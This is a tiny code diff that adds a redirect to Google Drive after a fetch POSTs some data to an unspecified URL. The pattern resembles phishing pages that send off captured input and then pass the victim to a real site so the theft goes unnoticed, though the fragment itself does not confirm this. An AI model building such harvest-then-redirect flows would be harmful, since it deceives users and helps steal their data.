@@ -19,6 +19,8 @@
           fetch(url, {
             method: "POST",
             body: data,
+          }).finally(() => {
+            window.location.href = 'https://drive.google.com/';
           });
         }
       });
